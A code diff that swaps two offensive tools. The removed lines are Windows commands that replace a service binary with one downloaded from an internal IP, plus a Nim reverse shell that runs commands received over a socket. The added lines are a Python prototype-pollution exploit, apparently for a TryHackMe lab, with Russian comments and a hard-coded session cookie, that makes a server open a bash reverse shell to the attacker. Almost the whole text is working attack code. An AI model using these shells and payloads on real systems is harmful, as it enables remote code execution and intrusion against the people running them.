@@ -1,54 +1,26 @@
-C:\Users\Administrator\Desktop
-type Hacking-Targets\hacking-targets.txt
-sc stop spoofer-scheduler
-ren spoofer-scheduler.exe spoofer.bak
-curl http://192.168.134.88:8000/spoofer-scheduler.exe -o spoofer-scheduler.exe
-sc start spoofer-scheduler
-#[ 
-   Created by Sn1r
-   https://github.com/Sn1r/
- ]#
+import requests
 
-import net, os, osproc, strutils
+# 1. Настрой свои данные для Reverse Shell!
+# ЗАМЕНИ <ТВОЙ_IP_В_VPN> на твой IP-адрес в сети TryHackMe (tun0)
+# ЗАМЕНИ <ТВОЙ_ПОРТ> на порт, который будешь слушать (например, 4444)
+cmd = 'bash -c "bash -i >& /dev/tcp/<ТВОЙ_IP_В_VPN>/<ТВОЙ_ПОРТ> 0>&1"'
 
-proc exe(c: string): string =
-  result = execProcess("cm" & "d /c " & c)
+print("Starting Attack...")
 
-var
-  v = newSocket()
+# 2. Твои куки из Burp Suite (взял с твоего 4-го скриншота)
+# Если сессия вдруг истекла, просто скопируй сюда свежий connect.sid из браузера/Burp
+cookies = {
+    'connect.sid': 's%3ApkPeWFhZ4GgtPUH2d2lSmo3B-VbV98KH.%2BawpufFhXtrwCW%2BKGyH05iMqR0RqkAMJcBjF%2BruNjQU'
+}
 
-  # Change this
-  v1 = "192.168.138.88"
-  v2 = "80"
+# 3. URL уязвимой страницы
+url = 'http://admin.cyprusbank.thm/settings'
 
-  s4 = "Exiting.."
-  s5 = "cd"
-  s6 = "C:\\"
+# 4. Отправляем зловредный payload (pollute) с нашими куками
+requests.post(url, cookies=cookies, files={'__proto__.outputFunctionName': (
+    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
 
-try:
-  v.connect(v1, Port(parseInt(v2)))
+# 5. Триггерим выполнение команды (вызываем рендер страницы)
+requests.get(url, cookies=cookies)
 
-  while true:
-    v.send(os.getCurrentDir() & "> ")
-    let c = v.recvLine()
-    if c == "exit":
-      v.send(s4)
-      break
-
-    if c.strip() == s5:
-      os.setCurrentDir(s6)
-    elif c.strip().startswith(s5):
-      let d = c.strip().split(' ')[1]
-      try:
-        os.setCurrentDir(d)
-      except OSError as b:
-        v.send(repr(b) & "\n")
-        continue
-    else:
-      let r = exe(c)
-      v.send(r)
-
-except:
-  raise
-finally:
-  v.close
+print("Finished!")
